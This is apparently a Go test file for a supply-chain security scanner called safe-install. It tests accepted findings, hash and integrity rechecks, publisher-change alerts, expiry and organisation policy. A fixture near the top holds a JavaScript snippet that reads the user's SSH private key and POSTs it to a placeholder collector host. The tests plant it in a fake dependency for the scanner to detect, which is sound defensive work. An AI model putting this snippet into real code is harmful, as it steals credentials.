package cli

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/crossben/safe-install/internal/policy"
)

func runCLIBoth(t *testing.T, args ...string) (stdout, stderr string, err error) {
	t.Helper()
	root := newRootCmd()
	var out, errb bytes.Buffer
	root.SetOut(&out)
	root.SetErr(&errb)
	root.SetArgs(args)
	err = root.Execute()
	return out.String(), errb.String(), err
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

// --- scan: code findings -------------------------------------------------

const evilJS = `const k = require('fs').readFileSync(require('os').homedir() + '/.ssh/id_rsa', 'utf8');
fetch('https://collector.example/k', { method: 'POST', body: k });`

// scanProject installs "evil@1.0.0" by hand (node_modules + lockfile), with
// the dangerous code in index.js and, when two is true, in lib/other.js too.
func scanProject(t *testing.T, two bool) (dir string) {
	t.Helper()
	dir = t.TempDir()
	writeFile(t, filepath.Join(dir, "package.json"), `{"name":"p","version":"1.0.0","dependencies":{"evil":"1.0.0"}}`)
	writeFile(t, filepath.Join(dir, "package-lock.json"), `{"lockfileVersion":3,"packages":{
		"":{"name":"p","dependencies":{"evil":"1.0.0"}},
		"node_modules/evil":{"version":"1.0.0","resolved":"https://registry.npmjs.org/evil/-/evil-1.0.0.tgz","integrity":"sha512-evil"}}}`)
	writeFile(t, filepath.Join(dir, "node_modules/evil/package.json"), `{"name":"evil","version":"1.0.0"}`)
	writeFile(t, filepath.Join(dir, "node_modules/evil/index.js"), evilJS)
	if two {
		writeFile(t, filepath.Join(dir, "node_modules/evil/lib/other.js"), evilJS+"\n")
	}
	t.Setenv("SAFE_INSTALL_CONFIG_DIR", t.TempDir())
	t.Setenv("SAFE_INSTALL_CACHE_DIR", t.TempDir())
	t.Setenv("SAFE_INSTALL_REGISTRY_FIXTURES", writeRegistry(t, "{}"))
	t.Chdir(dir)
	return dir
}

func writeRegistry(t *testing.T, doc string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "registry.json")
	writeFile(t, path, doc)
	return path
}

func acceptCode(t *testing.T, dir, file string, extra map[string]any) {
	t.Helper()
	hash, err := sha256File(filepath.Join(dir, "node_modules/evil"), file)
	if err != nil {
		t.Fatal(err)
	}
	acc := map[string]any{"version": "1.0.0", "rule": "SI-CODE-002", "file": file, "hash": hash,
		"reason": "reads its own test key", "by": "ben", "at": "2026-11-12", "expires": "2999-01-01"}
	for k, v := range extra {
		acc[k] = v
	}
	data, _ := json.Marshal(map[string]any{"acceptFindings": map[string]any{"evil": []any{acc}}})
	writeFile(t, filepath.Join(dir, policy.FileName), string(data))
}

func TestScanAcceptedCodeFindingPasses(t *testing.T) {
	dir := scanProject(t, false)
	if _, err := runCLIOut(t, "scan"); exitCode(err) != ExitPolicyFailure {
		t.Fatalf("without acceptance: exit %d (%v)", exitCode(err), err)
	}
	acceptCode(t, dir, "index.js", nil)
	out, stderr, err := runCLIBoth(t, "scan", "--fail-on", "high")
	if err != nil {
		t.Fatalf("scan: %v\n%s\n%s", err, out, stderr)
	}
	for _, want := range []string{"ACCEPTED (reads its own test key, by ben, until 2999-01-01)", "SI-CODE-002", "0 high (1 accepted)"} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q:\n%s", want, out)
		}
	}
	// JSON, SARIF
	out, err = runCLIOut(t, "scan", "--format", "json")
	if err != nil {
		t.Fatal(err)
	}
	var rep struct {
		Worst    string `json:"worst"`
		Packages []struct {
			Level    string `json:"level"`
			Findings []struct {
				File     string `json:"file"`
				Accepted *struct {
					Reason string `json:"reason"`
					Hash   string `json:"hash"`
				} `json:"accepted"`
			} `json:"findings"`
		} `json:"packages"`
	}
	if err := json.Unmarshal([]byte(out), &rep); err != nil {
		t.Fatal(err)
	}
	f := rep.Packages[0].Findings[0]
	if rep.Worst != "none" || rep.Packages[0].Level != "none" || f.File != "index.js" || f.Accepted == nil || f.Accepted.Reason != "reads its own test key" || f.Accepted.Hash == "" {
		t.Errorf("json: %s", out)
	}
	out, err = runCLIOut(t, "scan", "--format", "sarif")
	if err != nil || !strings.Contains(out, `"kind": "external"`) || !strings.Contains(out, `"justification": "reads its own test key"`) {
		t.Errorf("sarif (%v):\n%s", err, out)
	}
}

func TestScanChangedFileIsFlaggedAgain(t *testing.T) {
	dir := scanProject(t, false)
	acceptCode(t, dir, "index.js", nil)
	writeFile(t, filepath.Join(dir, "node_modules/evil/index.js"), evilJS+"\n// changed\n")
	out, stderr, err := runCLIBoth(t, "scan")
	if exitCode(err) != ExitPolicyFailure {
		t.Fatalf("exit %d (%v)\n%s", exitCode(err), err, out)
	}
	if !strings.Contains(stderr, "evil@1.0.0 SI-CODE-002 index.js not applied") || !strings.Contains(stderr, "hash mismatch") {
		t.Errorf("stderr:\n%s", stderr)
	}
	if strings.Contains(out, "ACCEPTED") {
		t.Errorf("still accepted:\n%s", out)
	}
}

func TestScanOtherFileOfSamePackageIsFlagged(t *testing.T) {
	dir := scanProject(t, true)
	acceptCode(t, dir, "index.js", nil)
	out, err := runCLIOut(t, "scan", "--format", "json")
	if exitCode(err) != ExitPolicyFailure {
		t.Fatalf("exit %d (%v)\n%s", exitCode(err), err, out)
	}
	if !strings.Contains(out, `"file": "lib/other.js"`) || strings.Count(out, `"accepted"`) != 1 {
		t.Errorf("want one accepted (index.js) and lib/other.js flagged:\n%s", out)
	}
}

func TestScanExpiredAcceptanceSaysSo(t *testing.T) {
	dir := scanProject(t, false)
	acceptCode(t, dir, "index.js", map[string]any{"expires": "2026-01-01"})
	_, stderr, err := runCLIBoth(t, "scan")
	if exitCode(err) != ExitPolicyFailure || !strings.Contains(stderr, "expired on 2026-01-01") {
		t.Errorf("exit %d (%v), stderr:\n%s", exitCode(err), err, stderr)
	}
}

func TestScanStaleWarningAndPrune(t *testing.T) {
	dir := scanProject(t, false)
	writeFile(t, filepath.Join(dir, policy.FileName), `{"acceptFindings":{
		"evil":[{"version":"0.9.0","rule":"SI-CODE-002","file":"index.js","hash":"sha256:x","reason":"old"},
		        {"version":"1.0.0","rule":"SI-CODE-001","file":"gone.js","hash":"sha256:x","reason":"expired","expires":"2026-01-01"},
		        {"version":"1.0.0","rule":"SI-CODE-002","file":"index.js","hash":"sha256:x","reason":"keep"}],
		"removed":[{"version":"3.0.0","rule":"SI-CODE-002","file":"a.js","hash":"sha256:x","reason":"old"}]}}`)
	_, stderr, _ := runCLIBoth(t, "scan")
	if !strings.Contains(stderr, "evil@0.9.0, removed@3.0.0") || !strings.Contains(stderr, "--prune-accepted") {
		t.Errorf("no stale warning:\n%s", stderr)
	}
	_, stderr, _ = runCLIBoth(t, "scan", "--prune-accepted")
	if !strings.Contains(stderr, "removed 2 stale and 1 expired") {
		t.Errorf("prune message:\n%s", stderr)
	}
	f, err := policy.Read(filepath.Join(dir, policy.FileName))
	if err != nil {
		t.Fatal(err)
	}
	if len(f.AcceptFindings) != 1 || len(f.AcceptFindings["evil"]) != 1 || f.AcceptFindings["evil"][0].Reason != "keep" {
		t.Errorf("after prune: %+v", f.AcceptFindings)
	}
}

// --- check: package-level findings (the tslib case) ------------------------

type tslibOpts struct {
	version   string // locked version
	publisher string // who published that version
	integrity string // lockfile integrity
	extraPkg  bool   // a second flagged package, "other"
}

const longAgo = "2025-01-01T00:00:00Z"

// tslibProject: tslib 2.8.1 was published long ago by "jcansdale"; the locked
// version was published 10 days ago by opts.publisher, who never published
// before, and a maintainer was added.
func tslibProject(t *testing.T, o tslibOpts) string {
	t.Helper()
	if o.version == "" {
		o.version = "2.9.1"
	}
	if o.publisher == "" {
		o.publisher = "microsoft1es"
	}
	if o.integrity == "" {
		o.integrity = "sha512-tslib291"
	}
	recent := time.Now().Add(-10 * 24 * time.Hour).UTC().Format(time.RFC3339)
	doc := func(name string) map[string]any {
		return map[string]any{
			"name": name,
			"time": map[string]string{"2.8.1": longAgo, o.version: recent},
			"versions": map[string]any{
				"2.8.1": map[string]any{"version": "2.8.1", "_npmUser": map[string]string{"name": "jcansdale"},
					"maintainers": []map[string]string{{"name": "jcansdale"}}, "dist": map[string]string{"integrity": "sha512-old"}},
				o.version: map[string]any{"version": o.version, "_npmUser": map[string]string{"name": o.publisher},
					"maintainers": []map[string]string{{"name": "jcansdale"}, {"name": o.publisher}}, "dist": map[string]string{"integrity": o.integrity}},
			},
		}
	}
	reg := map[string]any{"tslib": doc("tslib")}
	pkgs := `"node_modules/tslib":{"version":"` + o.version + `","resolved":"https://registry.npmjs.org/tslib/-/tslib-` + o.version + `.tgz","integrity":"` + o.integrity + `"}`
	deps := `"tslib":"` + o.version + `"`
	if o.extraPkg {
		reg["other"] = doc("other")
		pkgs += `,"node_modules/other":{"version":"` + o.version + `","resolved":"https://registry.npmjs.org/other/-/other-` + o.version + `.tgz","integrity":"` + o.integrity + `"}`
		deps += `,"other":"` + o.version + `"`
	}
	dir := t.TempDir()
	writeFile(t, filepath.Join(dir, "package.json"), `{"name":"p","version":"1.0.0","dependencies":{`+deps+`}}`)
	writeFile(t, filepath.Join(dir, "package-lock.json"), `{"lockfileVersion":3,"packages":{"":{"name":"p","dependencies":{`+deps+`}},`+pkgs+`}}`)
	data, _ := json.Marshal(reg)
	t.Setenv("SAFE_INSTALL_REGISTRY_FIXTURES", writeRegistry(t, string(data)))
	t.Setenv("SAFE_INSTALL_CONFIG_DIR", t.TempDir())
	t.Setenv("SAFE_INSTALL_CACHE_DIR", t.TempDir())
	t.Setenv("SAFE_INSTALL_OSV_URL", "off")
	t.Chdir(dir)
	return dir
}

func tslibAcceptance(over map[string]any) string {
	acc := map[string]any{"version": "2.9.1", "rule": "SI-REC-002", "integrity": "sha512-tslib291",
		"evidence": "publisher microsoft1es", "reason": "Microsoft's release account, listed maintainer; no install scripts",
		"by": "ben", "at": "2026-11-12", "expires": "2999-01-01"}
	for k, v := range over {
		acc[k] = v
	}
	data, _ := json.Marshal(map[string]any{"acceptFindings": map[string]any{"tslib": []any{acc}}})
	return string(data)
}

func TestCheckTslibFlaggedWithoutAcceptance(t *testing.T) {
	tslibProject(t, tslibOpts{})
	out, err := runCLIOut(t, "check", "--fail-on", "high")
	if exitCode(err) != ExitPolicyFailure {
		t.Fatalf("exit %d (%v)\n%s", exitCode(err), err, out)
	}
	if !strings.Contains(out, "published by \"microsoft1es\", who never published an earlier version") {
		t.Errorf("output:\n%s", out)
	}
}

func TestCheckTslibAcceptedPasses(t *testing.T) {
	dir := tslibProject(t, tslibOpts{})
	writeFile(t, filepath.Join(dir, policy.FileName), tslibAcceptance(nil))

	out, stderr, err := runCLIBoth(t, "check", "--fail-on", "high")
	if err != nil {
		t.Fatalf("check: %v\n%s\n%s", err, out, stderr)
	}
	for _, want := range []string{"ACCEPTED (Microsoft's release account, listed maintainer; no install scripts, by ben, until 2999-01-01)", "0 high (1 accepted)"} {
		if !strings.Contains(out, want) {
			t.Errorf("text missing %q:\n%s", want, out)
		}
	}
	// The same project is clean at --fail-on high but its low finding
	// (maintainers added) still counts at --fail-on low.
	if _, err := runCLIOut(t, "check", "--fail-on", "low"); exitCode(err) != ExitPolicyFailure {
		t.Errorf("the unaccepted low finding should still fail --fail-on low: %v", err)
	}

	out, _ = runCLIOut(t, "check", "--format", "json", "--fail-on", "high")
	var rep struct {
		Worst    string `json:"worst"`
		Packages []struct {
			Findings []struct {
				Rule     string `json:"rule"`
				Evidence string `json:"evidence"`
				Accepted *struct {
					Integrity string `json:"integrity"`
					Evidence  string `json:"evidence"`
				} `json:"accepted"`
			} `json:"findings"`
		} `json:"packages"`
	}
	if err := json.Unmarshal([]byte(out), &rep); err != nil {
		t.Fatal(err)
	}
	accepted := 0
	for _, f := range rep.Packages[0].Findings {
		if f.Accepted != nil {
			accepted++
			if f.Evidence != "publisher microsoft1es" || f.Accepted.Integrity != "sha512-tslib291" || f.Accepted.Evidence != f.Evidence {
				t.Errorf("accepted finding: %+v", f)
			}
		}
	}
	if accepted != 1 || rep.Worst != "low" {
		t.Errorf("accepted %d, worst %s:\n%s", accepted, rep.Worst, out)
	}

	out, _ = runCLIOut(t, "check", "--format", "sarif", "--fail-on", "high")
	if !strings.Contains(out, `"kind": "external"`) || !strings.Contains(out, `"justification": "Microsoft's release account`) {
		t.Errorf("sarif:\n%s", out)
	}

	out, _ = runCLIOut(t, "check", "--format", "markdown", "--fail-on", "high")
	if !strings.Contains(out, "<details>") || !strings.Contains(out, "1 accepted finding(s)") || !strings.Contains(out, "`SI-REC-002`") || !strings.Contains(out, "(1 accepted)") {
		t.Errorf("markdown:\n%s", out)
	}
}

func TestCheckAcceptanceDoesNotCarryToNewerVersionByAnotherPublisher(t *testing.T) {
	dir := tslibProject(t, tslibOpts{version: "2.9.2", publisher: "unknown-publisher", integrity: "sha512-tslib292"})
	writeFile(t, filepath.Join(dir, policy.FileName), tslibAcceptance(nil)) // reviewed 2.9.1 / microsoft1es
	out, err := runCLIOut(t, "check", "--fail-on", "high")
	if exitCode(err) != ExitPolicyFailure || !strings.Contains(out, "unknown-publisher") || strings.Contains(out, "ACCEPTED") {
		t.Fatalf("exit %d (%v)\n%s", exitCode(err), err, out)
	}
}

func TestCheckChangedIntegrityOrEvidenceFlagsAgain(t *testing.T) {
	// Same version, but the lockfile now pins another tarball.
	dir := tslibProject(t, tslibOpts{integrity: "sha512-other-tarball"})
	writeFile(t, filepath.Join(dir, policy.FileName), tslibAcceptance(nil))
	out, stderr, err := runCLIBoth(t, "check", "--fail-on", "high")
	if exitCode(err) != ExitPolicyFailure || strings.Contains(out, "ACCEPTED") || !strings.Contains(stderr, "integrity mismatch") {
		t.Fatalf("integrity: exit %d (%v)\n%s\n%s", exitCode(err), err, out, stderr)
	}
	// Same version and tarball, other publisher: the evidence changed.
	dir = tslibProject(t, tslibOpts{publisher: "someone-else"})
	writeFile(t, filepath.Join(dir, policy.FileName), tslibAcceptance(nil))
	out, stderr, err = runCLIBoth(t, "check", "--fail-on", "high")
	if exitCode(err) != ExitPolicyFailure || strings.Contains(out, "ACCEPTED") || !strings.Contains(stderr, "evidence changed") {
		t.Fatalf("evidence: exit %d (%v)\n%s\n%s", exitCode(err), err, out, stderr)
	}
}

func TestCheckTwoHighsOneAcceptedStillFails(t *testing.T) {
	dir := tslibProject(t, tslibOpts{extraPkg: true})
	writeFile(t, filepath.Join(dir, policy.FileName), tslibAcceptance(nil))
	out, err := runCLIOut(t, "check", "--fail-on", "high")
	if exitCode(err) != ExitPolicyFailure {
		t.Fatalf("exit %d (%v)\n%s", exitCode(err), err, out)
	}
	if !strings.Contains(out, "1 high (1 accepted)") {
		t.Errorf("summary:\n%s", out)
	}
}

func TestCheckExpiredAcceptanceFlagsAgain(t *testing.T) {
	dir := tslibProject(t, tslibOpts{})
	writeFile(t, filepath.Join(dir, policy.FileName), tslibAcceptance(map[string]any{"expires": "2026-01-01"}))
	out, stderr, err := runCLIBoth(t, "check", "--fail-on", "high")
	if exitCode(err) != ExitPolicyFailure || strings.Contains(out, "ACCEPTED") || !strings.Contains(stderr, "expired on 2026-01-01") {
		t.Fatalf("exit %d (%v)\n%s\n%s", exitCode(err), err, out, stderr)
	}
}

func TestCheckNeverAcceptsKnownMalware(t *testing.T) {
	dir := tslibProject(t, tslibOpts{})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"results":[{"vulns":[{"id":"MAL-2026-1"}]}]}`))
	}))
	defer srv.Close()
	t.Setenv("SAFE_INSTALL_OSV_URL", srv.URL)
	writeFile(t, filepath.Join(dir, policy.FileName), tslibAcceptance(map[string]any{"rule": "SI-VUL-001", "evidence": "MAL-2026-1"}))
	out, stderr, err := runCLIBoth(t, "check", "--fail-on", "block")
	if exitCode(err) != ExitPolicyFailure || strings.Contains(out, "ACCEPTED (") || !strings.Contains(stderr, "cannot be accepted") {
		t.Fatalf("exit %d (%v)\n%s\n%s", exitCode(err), err, out, stderr)
	}
}

func TestCheckOrgDisallowAcceptIsHonoured(t *testing.T) {
	dir := tslibProject(t, tslibOpts{})
	org := filepath.Join(t.TempDir(), "org.json")
	writeFile(t, org, `{"disallowAccept":["SI-REC-*"]}`)
	t.Setenv("SAFE_INSTALL_ORG_POLICY", org)
	writeFile(t, filepath.Join(dir, policy.FileName), tslibAcceptance(nil))
	out, stderr, err := runCLIBoth(t, "check", "--fail-on", "high")
	if exitCode(err) != ExitPolicyFailure || strings.Contains(out, "ACCEPTED (") || !strings.Contains(stderr, "organization policy forbids") {
		t.Fatalf("exit %d (%v)\n%s\n%s", exitCode(err), err, out, stderr)
	}
}

// The GitHub action runs `check --fail-on high` in the project: with the
// acceptance committed it passes, without it exits 1, and its summary file
// (the PR comment) lists the accepted finding in a collapsed section.
func TestActionFixtureAcceptance(t *testing.T) {
	dir := tslibProject(t, tslibOpts{})
	summary := filepath.Join(t.TempDir(), "summary.md")
	if _, err := runCLIOut(t, "check", "--fail-on", "high", "--min-age", "72h", "--summary-file", summary); exitCode(err) != ExitPolicyFailure {
		t.Fatalf("without the acceptance: exit %d (%v)", exitCode(err), err)
	}
	writeFile(t, filepath.Join(dir, policy.FileName), tslibAcceptance(nil))
	if _, err := runCLIOut(t, "check", "--fail-on", "high", "--min-age", "72h", "--summary-file", summary); err != nil {
		t.Fatalf("with the acceptance: %v", err)
	}
	data, err := os.ReadFile(summary)
	if err != nil || !strings.Contains(string(data), "<details>") || !strings.Contains(string(data), "0 high (1 accepted)") {
		t.Errorf("summary (%v):\n%s", err, data)
	}
}

func TestCheckForcedHighVulnerabilityAcceptancePasses(t *testing.T) {
	dir := tslibProject(t, tslibOpts{})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Path, "/v1/vulns/") {
			_, _ = w.Write([]byte(`{"id":"GHSA-xxxx-yyyy-zzzz","summary":"bad bug","database_specific":{"severity":"CRITICAL"}}`))
			return
		}
		_, _ = w.Write([]byte(`{"results":[{"vulns":[{"id":"GHSA-xxxx-yyyy-zzzz"}]}]}`))
	}))
	defer srv.Close()
	t.Setenv("SAFE_INSTALL_OSV_URL", srv.URL)

	if out, err := runCLIOut(t, "check", "--fail-on", "high"); exitCode(err) != ExitPolicyFailure || !strings.Contains(out, "GHSA-xxxx-yyyy-zzzz") {
		t.Fatalf("without acceptance: exit %d (%v)\n%s", exitCode(err), err, out)
	}
	// The fixture's own high finding (new publisher) is accepted too, so the
	// vulnerability is the only thing left that could fail --fail-on high.
	var both struct {
		A map[string][]map[string]any `json:"acceptFindings"`
	}
	_ = json.Unmarshal([]byte(tslibAcceptance(nil)), &both)
	vul := map[string]any{}
	for k, v := range both.A["tslib"][0] {
		vul[k] = v
	}
	vul["rule"], vul["evidence"] = "SI-VUL-001", "GHSA-xxxx-yyyy-zzzz"
	data, _ := json.Marshal(map[string]any{"acceptFindings": map[string]any{"tslib": []any{both.A["tslib"][0], vul}}})
	writeFile(t, filepath.Join(dir, policy.FileName), string(data))
	out, stderr, err := runCLIBoth(t, "check", "--fail-on", "high")
	if err != nil {
		t.Fatalf("check: %v\n%s\n%s", err, out, stderr)
	}
	if !strings.Contains(out, "ACCEPTED (") || !strings.Contains(out, "(2 accepted)") {
		t.Errorf("output:\n%s", out)
	}
}
